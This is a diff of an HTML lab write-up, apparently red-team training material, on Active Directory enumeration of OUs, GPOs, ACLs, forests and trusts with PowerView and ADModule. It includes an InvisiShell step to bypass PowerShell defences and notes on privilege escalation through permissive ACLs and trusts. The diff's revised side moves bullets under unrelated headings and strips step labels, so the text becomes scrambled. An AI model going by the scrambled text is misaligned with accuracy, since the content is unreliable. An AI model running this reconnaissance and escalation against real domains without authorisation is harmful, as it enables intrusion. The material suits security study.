 <p>Then, the **Administrators group** on all targeted systems will only contain `Domain Admins` and `ITSupport`, regardless of any manual changes made locally.</p>
 <p>Issuing the following command, we are able to gather the Restricted groups.</p>
 <p>`Get-DomainGPOLocalGroup`</p>
-<img src="./images/screenshot_68.png" alt="image" class="content-image">
+<img src="./images/screenshot_18.png" alt="image" class="content-image">
 <p>It is possible to see that we do have one Restricted Group in the domain, named `machineadmins`.</p>
 <p>Now that we already know that we do have at least one Restricted Group.</p>
 <p>Let’s see if we can find out the members of this Restricted Group.</p>
@@ -554,32 +503,34 @@
 <li>Users</li>
 <li>Groups</li>
 <li>Computers</li>
-<li>Other OUs (nested OUs)</li>
-</ul>
+<li>
+<div class="li-header">Other OUs (nested OUs)</div>
 <p>OUs provide administrators with a way to group related objects, delegate administrative tasks, and apply Group Policy Objects (GPOs) to specific sets of objects. They are an essential component of AD's hierarchical structure, enabling fine-grained control over resources in the network.</p>
 <p>OUs are critical because they provide valuable information about how the target organization structures its resources, policies, and privileges. Understanding the OU structure can help an attacker identify high-value targets, privilege escalation paths, and misconfigurations</p>
+</li>
+</ul>
 <h3>OU Enumeration with ADModule</h3>
 <p>Let’s start this enumeration using ADModule.</p>
 <p>`Get-ADOrganizationalUnit`</p>
-<img src="./images/screenshot_69.png" alt="image" class="content-image">
+<img src="./images/screenshot_19.png" alt="image" class="content-image">
 <p>Using the ADModule above, we were able to retrieve the OUs we do have configured on `us.techcorp.local` domain(the domain we are right now).</p>
 <p>Now that we were able to find all the OU inside our domain, we can see or list all the computers that belong to any specific student of our choice.</p>
 <p>Let’s use `Students OU` and list all the computers inside this OU.</p>
 <p>`Get-ADOrganizationalUnit -Identity 'OU=Students,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name`</p>
-<img src="./images/screenshot_70.png" alt="image" class="content-image">
+<img src="./images/screenshot_20.png" alt="image" class="content-image">
 <p>Amazing, inside the Students OU we do have all the students machines.</p>
 <h3>OU Enumeration with PowerView</h3>
 <p>To enumerate OU inside the domain we can use the `Get-DomainOU` command.</p>
 <p>`Get-DomainOU`</p>
-<img src="./images/screenshot_71.png" alt="image" class="content-image">
+<img src="./images/screenshot_21.png" alt="image" class="content-image">
 <p>Using PowerView module we were able to retrieve all the OUs configured in this Domain.</p>
 <p>Now let’s enumerate all the computers that belong to `Students OU`.</p>
 <p>`(Get-DomainOU -Identity 'Students').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Select name`</p>
-<img src="./images/screenshot_72.png" alt="image" class="content-image">
+<img src="./images/screenshot_22.png" alt="image" class="content-image">
 <p>Now we do have the full list of computers inside `Students` OU. We can see that all the students computers belong to this student OU.</p>
 <p>Let’s say we want to enumerate the GPO  applied to `Students` OU. To achieve this task, all we need to do is to use Get-DomainGPO and filter by the **unique identifier (GUID)** of the GPO we are querying. Since we made a request of all OU previously with command `Get-DomainOU`, we can find the **unique identifier (GUID) **under the `glink` property (`[LDAP://cn={FCE16496-C744-4E46-AC89-2D01D76EAD68},cn=policies,cn=system,DC=us,DC=techcorp,DC=local;0]`**)**</p>
 <p>`Get-DomainGPO -Identity '{FCE16496-C744-4E46-AC89-2D01D76EAD68}'`</p>
-<img src="./images/screenshot_73.png" alt="image" class="content-image">
+<img src="./images/screenshot_23.png" alt="image" class="content-image">
 <p>We can see, we are able to find what GPO is being applied to Students OU with a single command. Remember that this can be done with anyone OU based on OU’s **unique identifier (GUID).**</p>
 <h3>**Enumerating ACL (Access Control List)**</h3>
 <p>**Access Control Lists (ACLs)** in Active Directory (AD) are critical components that govern permissions and access rights within an AD environment.</p>
@@ -594,137 +545,85 @@
 <li>Advanced permissions allow granular control, such as modifying group membership, resetting passwords, or managing service principals.</li>
 </ul>
 <h3>**Importance of ACLs in Active Directory**</h3>
-<ol>
-<li>**Securing Resources**:</li>
-</ol>
 <ul>
 <li>ACLs control access to sensitive resources like files, user accounts, and domain controllers.</li>
 <li>Misconfigured ACLs can grant excessive privileges, leading to data breaches or privilege escalation.</li>
 </ul>
-<ol>
-<li>**Delegating Administrative Tasks**:</li>
-</ol>
-<ul>
-<li>ACLs enable granular delegation, allowing specific administrative tasks to be assigned to non-administrators without granting full control.</li>
-</ul>
-<ol>
-<li>**Preventing Lateral Movement**:</li>
-</ol>
-<ul>
-<li>Properly configured ACLs restrict unauthorized access, limiting an attacker’s ability to move laterally within the domain.</li>
-</ul>
-<ol>
-<li>**Enforcing Compliance**:</li>
-</ol>
+<h3>**Why Enumerating ACLs Is Important in a Red Team Engagement**</h3>
 <ul>
 <li>SACLs ensure proper auditing of critical actions, such as who modified group memberships or accessed sensitive objects.</li>
 </ul>
-<h3>**Why Enumerating ACLs Is Important in a Red Team Engagement**</h3>
 <p>During a Red Team engagement, enumerating ACLs is a critical step because misconfigured or overly permissive ACLs often provide a pathway to privilege escalation or lateral movement. Here's why:</p>
-<ol>
-<li>**Identifying Weak Permissions**:</li>
-</ol>
 <ul>
 <li>Overly permissive ACLs might allow low-privileged users to perform high-impact actions, such as:</li>
 <li>Resetting passwords for privileged accounts.</li>
 <li>Adding themselves to sensitive groups like **Domain Admins**.</li>
 <li>Modifying security group memberships.</li>
 </ul>
-<ol>
-<li>**Discovering Privilege Escalation Paths**:</li>
-</ol>
 <ul>
 <li>Misconfigured permissions on critical AD objects can create attack paths. For example:</li>
 <li>A low-privileged user has **WriteProperty** permissions on a service account that is a member of the **Domain Admins** group.</li>
 <li>Exploiting this misconfiguration allows the attacker to escalate privileges.</li>
 </ul>
-<ol>
-<li>**Abusing Delegated Access**:</li>
-</ol>
-<ul>
-<li>Delegated permissions on OUs or specific users might reveal opportunities to abuse privileges intended for non-admin users.</li>
-</ul>
-<ol>
-<li>**Planning Stealthy Attacks**:</li>
-</ol>
-<ul>
-<li>By enumerating ACLs, attackers can identify "quiet" paths to escalate privileges or persist within the domain without triggering alerts.</li>
-</ul>
 <h3>**Use Case: Enumerating ACLs During a Pentesting Engagement**</h3>
 <h3>**Scenario: Privilege Escalation via Misconfigured ACLs**</h3>
-<ol>
-<li>**Initial Access**:</li>
-</ol>
 <ul>
 <li>A pentester gains access to a compromised user account (e.g., via phishing or credential stuffing).</li>
 <li>The compromised account belongs to a low-privileged user in the domain.</li>
 </ul>
-<ol>
-<li>**Enumeration of ACLs**:</li>
-</ol>
 <ul>
 <li>The pentester enumerates ACLs on domain objects like users, groups, and OUs.</li>
 <li>They find that the compromised user has **WriteProperty** permissions on a service account (e.g., `SQLService`).</li>
 </ul>
-<ol>
-<li>**Exploitation**:</li>
-</ol>
 <ul>
 <li>The pentester abuses **WriteProperty** permissions to reset the password of the `SQLService` account.</li>
 <li>`SQLService` is found to be a member of the **Domain Admins** group.</li>
 </ul>
-<ol>
-<li>**Privilege Escalation**:</li>
-</ol>
-<ul>
-<li>With the new password, the pentester authenticates as `SQLService` and gains Domain Admin privileges.</li>
-</ul>
-<ol>
-<li>**Post-Exploitation**:</li>
-</ol>
-<ul>
-<li>The pentester continues to enumerate additional ACLs for persistence mechanisms, such as adding shadow administrators or backdoors.</li>
-</ul>
 <h3>**Lessons Learned**:</h3>
 <ul>
+<li>The pentester continues to enumerate additional ACLs for persistence mechanisms, such as adding shadow administrators or backdoors.</li>
 <li>Misconfigured ACLs directly led to privilege escalation.</li>
-<li>Lack of proper auditing (SACLs) may have allowed the attack to go unnoticed during execution.</li>
-</ul>
+<li>
+<div class="li-header">Lack of proper auditing (SACLs) may have allowed the attack to go unnoticed during execution.</div>
 <p>We have 2 options to enumerate ACL inside the us.techcorp.local domain. Let’s achieve this goal using ADModule and also PowerView.</p>
+</li>
+</ul>
 <h3>**Enumerating ACL with ADModule **</h3>
 <p>Let’s say we want to **enumerate the ACLs on the Domain Admins group object itself**, showing who has permissions to manage or interact with that group.</p>
 <p>`Get-ACL 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local' | select -ExpandProperty Access`</p>
-<img src="./images/screenshot_74.png" alt="image" class="content-image">
+<img src="./images/screenshot_24.png" alt="image" class="content-image">
 <p>Above we do have several ACLs but I just showed 4 of the several ACL,. We are inspecting the **Access Control List (ACL)** of the **Domain Admins** group, specifically focusing on its **Access Control Entries (ACEs)**.</p>
 <p>This provides details about **who has permissions** on the object and **what actions they are allowed to perform**.</p>
 <p>Our current command is **enumerating the ACLs on the Domain Admins group object itself**, showing who has permissions to manage or interact with that group.</p>
 <h3>Enumerating ACLs with PowerView</h3>
 <p>To enumerate ACLs using PowerView, we can user the `Get-DomainObjectACL` command.</p>
 <p>`Get-DomainObjectACL`</p>
-<img src="./images/screenshot_75.png" alt="image" class="content-image">
+<img src="./images/screenshot_25.png" alt="image" class="content-image">
 <p>The Command Above will list all the ACLs we do have configure on the domain.</p>
 <p>Let’s say that we do want to see what ACLs are Applied to Domain Admins Group as we did previously with ADModule. To achive this task we can simply filter by the Group name.</p>
 <p>`Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs -Verbose`</p>
-<img src="./images/screenshot_76.png" alt="image" class="content-image">
+<img src="./images/screenshot_26.png" alt="image" class="content-image">
 <p>We were able to get a list of all ACLs in domain `us.techcorp.local`</p>
 <p>Now let’s do something interesting here. Since we are a valid domain user, let’s see if we do have any valid or modified RIGHTS/PERMISSIONS on object inside the domain.</p>
 <p>We are studentuser163, so in this case we will be checking, what permissions our user has in this domain.</p>
 <p>All we need to do is to filter based on our username.</p>
 <p>> `Note: Please pay attention that, this type of query may take some time to finish.`</p>
 <p>`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'studentuser163'}`</p>
-<img src="./images/screenshot_77.png" alt="image" class="content-image">
+<img src="./images/screenshot_27.png" alt="image" class="content-image">
 <p>Above we can see that we have not received any output, it means that our current user `studentuser163` does not contain any RIGHT or PERMISSION on any object inside `us.techcorp.local` domain.</p>
 <p>Let’s now try the same query, but, this type let’s check rights and permissions of the group `StudentsUsers`, which is the group where our `studentuser163` is MemberOf.</p>
 <p>The query will be exactly the same, with a small difference that instead of using the username we will use the group name our user belongs to.</p>
 <p>`Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'StudentUsers'}`</p>
-<img src="./images/screenshot_78.png" alt="image" class="content-image">
+<img src="./images/screenshot_28.png" alt="image" class="content-image">
 <p>As a member of the `StudentsUsers` group we do have:</p>
 <p>**GenericAll on **`Support168User`** , **`Support169User`** and **`Support170User`:</p>
 <ul>
-<li>Full control, allowing password resets, attribute modifications, group membership changes, or deletion of these accounts. This can be used for **privilege escalation** if these accounts have elevated privileges.</li>
-</ul>
+<li>
+<div class="li-header">Full control, allowing password resets, attribute modifications, group membership changes, or deletion of these accounts. This can be used for **privilege escalation** if these accounts have elevated privileges.</div>
 <p>**Permissions on **`MailMgmt`** OU**:</p>
 <p>These permissions offer opportunities for **privilege escalation** by taking control of the `Support` accounts or manipulating objects in the `MailMgmt` OU.</p>
+</li>
+</ul>
 <p>Regular ACL reviews are critical to prevent such misconfigurations.</p>
 <h3>**Enumerating Domain, Forest & Trusts **</h3>
 <p>**Domain, forest, and trust enumeration** is a crucial phase in Active Directory (AD) enumeration during penetration testing or Red Team engagements. This process provides insights into the structure, relationships, and potential attack paths within and across AD environments. Understanding how domains, forests, and trusts interact is essential for identifying misconfiguration and opportunities for lateral movement, privilege escalation, and even cross-domain compromises.</p>
@@ -757,34 +656,14 @@
 <li>**Two-Way Trust**: Access is mutual between both domains or forests.</li>
 </ul>
 <h3>**Why Enumerate Domains, Forests, and Trusts?**</h3>
-<ol>
-<li>**Mapping the Environment**:</li>
-</ol>
 <ul>
 <li>Provides a clear picture of the AD structure, including the domains and forests.</li>
 <li>Identifies trust relationships and their directions (one-way or two-way).</li>
 </ul>
-<ol>
-<li>**Identifying Attack Paths**:</li>
-</ol>
-<ul>
-<li>Misconfigured trusts or overly permissive permissions can allow attackers to move laterally between domains or escalate privileges across forests.</li>
-</ul>
-<ol>
-<li>**Expanding the Scope of Access**:</li>
-</ol>
-<ul>
-<li>Enumeration reveals resources and accounts in trusted domains or forests that may be accessible using the attacker’s current privileges.</li>
-</ul>
-<ol>
-<li>**Exploiting Trusts**:</li>
-</ol>
-<ul>
-<li>Trust relationships can be abused to access sensitive data, compromise privileged accounts, or control remote systems.</li>
-</ul>
 <h3>**Key Aspects to Enumerate**</h3>
 <h3>**1. Domain Enumeration**</h3>
 <ul>
+<li>Trust relationships can be abused to access sensitive data, compromise privileged accounts, or control remote systems.</li>
 <li>**Domain Controllers (DCs)**:</li>
 <li>Identify the DCs within the domain. They are critical as they handle authentication, enforce policies, and replicate directory information.</li>
 <li>**Domain Policies**:</li>
@@ -817,65 +696,22 @@
 </ul>
 <h3>**Use Case in Red Team Engagement**</h3>
 <h3>**Scenario: Exploiting a Misconfigured Trust**</h3>
-<ol>
-<li>**Initial Access**:</li>
-</ol>
-<ul>
-<li>The attacker compromises a low-privileged account in Domain A.</li>
-</ul>
-<ol>
-<li>**Trust Enumeration**:</li>
-</ol>
-<ul>
-<li>Using `Get-ADTrust`, the attacker discovers a two-way trust between Domain A and Domain B.</li>
-</ul>
-<ol>
-<li>**Privilege Escalation**:</li>
-</ol>
 <ul>
 <li>The attacker identifies that Domain B does not have SID filtering enabled.</li>
 <li>They craft a malicious SID to impersonate a privileged account in Domain B.</li>
 </ul>
-<ol>
-<li>**Result**:</li>
-</ol>
-<ul>
-<li>The attacker gains access to Domain B’s resources, including privileged accounts or sensitive data.</li>
-</ul>
 <h3>**Common Misconfigurations to Look For**</h3>
-<ol>
-<li>**Overly Permissive Trusts**:</li>
-</ol>
-<ul>
-<li>Trust relationships that allow all authenticated users to access resources in the trusted domain.</li>
-</ul>
-<ol>
-<li>**Disabled SID Filtering**:</li>
-</ol>
-<ul>
-<li>Allows attackers to abuse SIDs from one domain in another.</li>
-</ul>
-<ol>
-<li>**Weak Password Policies**:</li>
-</ol>
-<ul>
-<li>Poor policies in trusted domains can lead to easy account compromise and escalation.</li>
-</ul>
-<ol>
-<li>**Unrestricted Kerberos Delegation**:</li>
-</ol>
+<h3>Enumerating Domains with ADModule</h3>
 <ul>
 <li>Allows an attacker to impersonate accounts across domains.</li>
 </ul>
-<p>Domain, forest, and trust enumeration is a critical step in understanding the structure and relationships within an AD environment. By identifying trust relationships and their weaknesses, attackers can map out attack paths for lateral movement and privilege escalation. Organizations must focus on securing trust configurations, enabling proper filtering, and monitoring cross-domain activity to mitigate these risks. For Red Teams, trust enumeration provides powerful insights into potential avenues for cross-domain compromises, making it an indispensable part of AD enumeration.</p>
-<h3>Enumerating Domains with ADModule</h3>
 <p>Let’s make sure that we have executed InvisiShell to bypass the 4 Powershell defense mechanisms.</p>
 <p>`RunWithRegistryNonAdmin.bat`</p>
-<img src="./images/screenshot_79.png" alt="image" class="content-image">
+<img src="./images/screenshot_29.png" alt="image" class="content-image">
 <p>Now let’s start by issuing the `Get-ADForest` to get a full overview of all the domains.</p>
 <p>This command quickly maps the forest's structure, identifies key servers (e.g., Domain Controllers, Global Catalogs), and highlights potential targets for attacks or lateral movement.</p>
 <p>`Get-ADForest`</p>
-<img src="./images/screenshot_80.png" alt="image" class="content-image">
+<img src="./images/screenshot_30.png" alt="image" class="content-image">
 <p>This command quickly maps the forest's structure, identifies key servers (e.g., Domain Controllers, Global Catalogs), and highlights potential targets for attacks or lateral movement.</p>
 <p>The `Get-ADForest` command enumerates the structure and key components of the Active Directory **forest**. It provides a summary of:</p>
 <ol>
@@ -891,26 +727,28 @@
 <li>**Forest Functional Level**: Features available in the forest (`Windows2016Forest`).</li>
 <li>**Application Partitions**: DNS replication zones (`DomainDnsZones` and `ForestDnsZones`).</li>
 <li>**Root Domain**: Identifies the forest's root domain (`techcorp.local`).</li>
-<li>**Sites**: Lists AD sites (`Default-First-Site-Name`).</li>
-</ol>
+<li>
+<div class="li-header">**Sites**: Lists AD sites (`Default-First-Site-Name`).</div>
 <p>If we just want to bring a list of all domains inside this forest, we can simply use the same query, but this time we can filter by `Domains` property.</p>
 <p>`(Get-ADForest).Domains`</p>
-<img src="./images/screenshot_81.png" alt="image" class="content-image">
+<img src="./images/screenshot_31.png" alt="image" class="content-image">
 <p>Above we can see all the domains belonging to this forest.</p>
+</li>
+</ol>
 <h3>Enumerating Domains with PowerView</h3>
 <p>PowerView enumeration will bring the output a bit different from ADModule even tho we are basically carrying the same information.</p>
 <p>`Get-ForestDomain -Verbose`</p>
-<img src="./images/screenshot_82.png" alt="image" class="content-image">
+<img src="./images/screenshot_32.png" alt="image" class="content-image">
 <p>The output from PowerView will tell us in simple words what is the Forest name we are currently, which is this case the current forest is `techcorp.local`.</p>
 <p>We can also see that we only have one Childen Domain (`us.techcorp.local`).</p>
 <p>Keep in mind that the command below will only show us domains within forest, no external domains will be shown here.</p>
 <p>We can simply query all domains from this forest by filtering by `name` property.</p>
 <p>`Get-ForestDomain -Verbose | Select -ExpandProperty Name`</p>
-<img src="./images/screenshot_83.png" alt="image" class="content-image">
+<img src="./images/screenshot_33.png" alt="image" class="content-image">
 <h3>Enumerating Trusts with ADModule</h3>
 <p>We can also map or enumerate all the Trusts we do have from the current domain we are part of (`us.techcorp.local`).</p>
 <p>`Get-ADTrust -Filter *`</p>
-<img src="./images/screenshot_84.png" alt="image" class="content-image">
+<img src="./images/screenshot_34.png" alt="image" class="content-image">
 <p>The above query will show us that we do have 2 Trusts which both of them are BiDirectional Trusts. To be able to determine which type of Trusts we do have, we should pay attention on the following properties on the previous query.</p>
 <ul>
 <li>**(techcorp.local) Internal Trust**</li>
@@ -919,23 +757,21 @@
 <li>**ForestTransitive**: `False` → Restricted within the forest (likely parent-child relationship).</li>
 <li>**Direction**: BiDirectional</li>
 <li>**TrustType**: `UPLEVEL (0x00000002)` - A trusted Windows domain that is running Active Directory.</li>
-</ul>
-<ul>
-<li>**(eu.local) External Trust**</li>
+<li>
+<div class="li-header">**(eu.local) External Trust**</div>
+<p>TrustType:</p>
+</li>
 <li>**Name**: `eu.local` → Different domain from `Source`.</li>
 <li>**IntraForest**: `False` → External trust.</li>
 <li>**ForestTransitive**: `False` → Likely a specific domain-to-domain trust, not spanning multiple domains.</li>
 <li>**Direction**: BiDirectional</li>
 <li>**TrustType**: `UPLEVEL (0x00000002)` - A trusted Windows domain that is running Active Directory.</li>
-</ul>
-<p>TrustType:</p>
-<ul>
 <li>**DOWNLEVEL** (0x00000001) — A trusted Windows domain that IS NOT running Active Directory. This is output as **WINDOWS_NON_ACTIVE_DIRECTORY** in PowerView for those not as familiar with the terminology.</li>
 <li>**UPLEVEL** (0x00000002) — A trusted Windows domain that is running Active Directory.This is output as **WINDOWS_ACTIVE_DIRECTORY** in PowerView for those not as familiar with the terminology.</li>
-<li>**MIT** (0x00000003) — a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.</li>
-</ul>
+<li>
+<div class="li-header">**MIT** (0x00000003) — a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.</div>
 <p>TrustAttributes:</p>
-<ul>
+</li>
 <li>**NON_TRANSITIVE** (0x00000001) — The trust cannot be used transitively. That is, if DomainA trusts DomainB and DomainB trusts DomainC, then DomainA does not automatically trust DomainC. Also, if a trust is non-transitive, thenyou will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive.</li>
 <li>**UPLEVEL_ONLY** (0x00000002) — only Windows 2000 operating system and newer clients can use the trust.</li>
 <li>**QUARANTINED_DOMAIN **(0x00000004) — SID filtering is enabled (more on this later). Output as **FILTER_SIDS** with PowerView for simplicity.</li>
@@ -954,7 +790,7 @@
 <p>The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.*”</p>
 <p>Since we do have a 2-Ways or BiDirectional trust with an External Trust  `eu.local`, we can also query the Trusts `eu.local` have.</p>
 <p>`Get-ADTrust -Filter * -Server eu.local`</p>
-<img src="./images/screenshot_85.png" alt="image" class="content-image">
+<img src="./images/screenshot_35.png" alt="image" class="content-image">
 <ul>
 <li>**(us.techcorp.local → eu.local)** External Trust</li>
 <li>**Direction**: Bidirectional → Mutual access between both domains.</li>
@@ -967,7 +803,13 @@
 <li>**Target**: `us.techcorp.local` → Trust applies to this external domain.</li>
 <li>**TrustType**: **Uplevel** → The trusted domain runs Active Directory.</li>
 <li>**SelectiveAuthentication**: `False` → All authenticated users in `us.techcorp.local` can access resources in `eu.local` (permissions dependent).</li>
-<li>**(euvendor.local → eu.local)** External Trust</li>
+<li>
+<div class="li-header">**(euvendor.local → eu.local)** External Trust</div>
+<p>We can see above that our Extrenal Trust **eu.local** also has some External Trusts with `eu.techcorp.local` (which is the domain we are currently) and  with `euvendor.local`.</p>
+<p>Now let’s say we want to enumerate the trusts of our root or Parent Domain (`techcorp.local`).</p>
+<p>`Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name`</p>
+<p>We can see above that our parent domain techcorp.local has 2 external Trust relationship.</p>
+</li>
 <li>**Direction**: Bidirectional → Mutual access between both domains.</li>
 <li>**Name**: `euvendor.local` → Another external domain trusted by `eu.local`.</li>
 <li>**IntraForest**: `False` → Indicates an external trust, not part of the same forest.</li>
@@ -978,13 +820,6 @@
 <li>**Target**: `euvendor.local` → Trust applies to this external domain.</li>
 <li>**TrustType**: **Uplevel** → The trusted domain runs Active Directory.</li>
 <li>**SelectiveAuthentication**: `False` → All authenticated users in `euvendor.local` can access resources in `eu.local` (permissions dependent).</li>
-</ul>
-<p>We can see above that our Extrenal Trust **eu.local** also has some External Trusts with `eu.techcorp.local` (which is the domain we are currently) and  with `euvendor.local`.</p>
-<p>Now let’s say we want to enumerate the trusts of our root or Parent Domain (`techcorp.local`).</p>
-<p>`Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name`</p>
-<img src="./images/screenshot_86.png" alt="image" class="content-image">
-<p>We can see above that our parent domain techcorp.local has 2 external Trust relationship.</p>
-<ul>
 <li>**(usvendor.local) External Trust**</li>
 <li>**Name**: `usvendor.local` → Different domain from `Source`.</li>
 <li>**IntraForest**: `False` → External trust.</li>
@@ -1003,7 +838,7 @@
 <h3>Enumerating Trusts with PowerView</h3>
 <p>Let’s now Enumerate Trusts using PowerView module.</p>
 <p>`Get-DomainTrust -Verbose`</p>
-<img src="./images/screenshot_87.png" alt="image" class="content-image">
+<img src="./images/screenshot_36.png" alt="image" class="content-image">
 <p>The output of our Trusts enumeration using PowerView reveal basically what we have seen already using ADModule Trust enumeration. The query we did will only bring all the Trusts we do have inside our current domain `eu.techcorp.local`.</p>
 <h3>Trusts</h3>
 <p>`UPLEVEL (0x00000002)` - A trusted Windows domain that is running Active Directory.This is output as **WINDOWS_ACTIVE_DIRECTORY** in PowerView for those not as familiar with the terminology.</p>
@@ -1014,10 +849,10 @@
 <ul>
 <li>**DOWNLEVEL** (0x00000001) — A trusted Windows domain that IS NOT running Active Directory. This is output as **WINDOWS_NON_ACTIVE_DIRECTORY** in PowerView for those not as familiar with the terminology.</li>
 <li>**UPLEVEL** (0x00000002) — A trusted Windows domain that is running Active Directory.This is output as **WINDOWS_ACTIVE_DIRECTORY** in PowerView for those not as familiar with the terminology.</li>
-<li>**MIT** (0x00000003) — a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.</li>
-</ul>
+<li>
+<div class="li-header">**MIT** (0x00000003) — a trusted domain that is running a non-Windows (*nix), RFC4120-compliant Kerberos distribution. This is labeled as MIT due to, well, MIT publishing RFC4120.</div>
 <p>TrustAttributes:</p>
-<ul>
+</li>
 <li>**NON_TRANSITIVE** (0x00000001) — The trust cannot be used transitively. That is, if DomainA trusts DomainB and DomainB trusts DomainC, then DomainA does not automatically trust DomainC. Also, if a trust is non-transitive, thenyou will not be able to query any Active Directory information from trusts up the chain from the non-transitive point. External trusts are implicitly non-transitive.</li>
 <li>**UPLEVEL_ONLY** (0x00000002) — only Windows 2000 operating system and newer clients can use the trust.</li>
 <li>**QUARANTINED_DOMAIN **(0x00000004) — SID filtering is enabled (more on this later). Output as **FILTER_SIDS** with PowerView for simplicity.</li>
@@ -1036,7 +871,7 @@
 <p>The trusting domain allows SIDs that are local to its forest to come over a PrivilegedIdentityManagement trust.*”</p>
 <p>Let’s now query all the External Trusts we do have from our current domain `eu.techcorp.local`.</p>
 <p>`Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}`</p>
-<img src="./images/screenshot_88.png" alt="image" class="content-image">
+<img src="./images/screenshot_37.png" alt="image" class="content-image">
 <h3>**(us.techcorp.local → eu.local) Domain Trust**</h3>
 <ul>
 <li>**Direction**: Bidirectional → Mutual trust, allowing access between both domains.</li>
@@ -1045,13 +880,15 @@
 <li>**TrustType**: WINDOWS_ACTIVE_DIRECTORY → The trusted domain is running Active Directory.</li>
 <li>**TrustAttributes**: FILTER_SIDS → SID filtering is enabled to protect against SID injection attacks.</li>
 <li>**WhenCreated**: `7/13/2019 11:17:35 AM` → The trust was established on this date.</li>
-<li>**WhenChanged**: `1/17/2025 5:06:16 AM` → The trust was last modified on this date.</li>
-</ul>
+<li>
+<div class="li-header">**WhenChanged**: `1/17/2025 5:06:16 AM` → The trust was last modified on this date.</div>
 <p>We can see above that we do have a BiDirectional Trust between `us.techcorp.local <---> eu.local`.</p>
 <p>Trust between `us.techcorp.local` and `eu.local` is a **domain-level bidirectional trust** with **SID filtering enabled** for security. This protects the trusting domain from SID injection attacks.</p>
 <p>Since we do have a 2-Ways or BiDirectional trust with an External Trust with`eu.local`, we can also query the Trust `eu.local` have.</p>
 <p>`Get-ForestTrust -Forest eu.local`</p>
-<img src="./images/screenshot_89.png" alt="image" class="content-image">
+<img src="./images/screenshot_38.png" alt="image" class="content-image">
+</li>
+</ul>
 <h3>**(euvendor.local → eu.local) Forest Trust**</h3>
 <ul>
 <li>**Direction**: Bidirectional → Mutual access between both forests.</li>
@@ -1059,9 +896,11 @@
 <li>**ExcludedTopLevelNames**: `{}` → No domains are excluded from this trust.</li>
 <li>**SourceName**: `eu.local` → The trust originates from the `eu.local` forest.</li>
 <li>**TargetName**: `euvendor.local` → The trust applies to the external forest `euvendor.local`.</li>
-<li>**TrustType**: Forest → A forest-level trust that applies across all domains in both forests.</li>
-</ul>
+<li>
+<div class="li-header">**TrustType**: Forest → A forest-level trust that applies across all domains in both forests.</div>
 <p>Trust between `eu.local` and `euvendor.local` is a **forest-level trust** and is **bidirectional**, enabling resource sharing across all domains within both forests. No exclusions or limitations are applied to the trusted domains.</p>
+</li>
+</ul>
 <p>We have now completed all the steps needed for a good enumeration inside our target environment.</p>
 <p>Let’s now move to the next step to explore some privilege escalation techniques.</p>
         </main>
